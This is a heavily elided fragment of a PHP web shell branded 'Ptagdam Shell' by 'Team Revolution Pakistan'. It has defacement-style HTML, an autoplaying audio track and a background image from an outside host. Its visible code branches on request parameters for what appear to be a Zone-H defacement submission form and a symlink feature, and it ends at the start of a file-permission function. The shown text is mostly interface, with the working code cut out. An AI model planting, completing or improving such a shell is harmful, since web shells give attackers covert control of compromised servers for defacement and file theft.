...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://b.top4top.io/p_25041wrk40.jpg);
...
<center>
<br>
<font face="Kelly Slab" color="red" size="7px">WELCOME TO Ptagdam Shell</font><br>
</h1></center>
<center><b><font face="courier new" color="yellow" size="9">Team Revolution Pakistan</font></b></center>
<marquee><b><fonte face="courier new" color="white" size="4">Team Revolution Pakistan Cyber Hunter 102_ And All My Friend</font></b></marquee>
<center><audio autoplay="autoplay" controls="controls" src="https://l.top4top.io/m_2492oxs490.mp3" type="audio/mpeg"></audio></center>
...
+ Coded By   <td>: <font color='LightBlue'>Ptagdam<tr></font></tr></td><br>
</table>";
...
if($_GET['to'] == 'zoneh') {
	...
	<input type='submit' name='start' value='Done!' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">" Ptagdam </center>
</body>
</html>';
function perms($file){
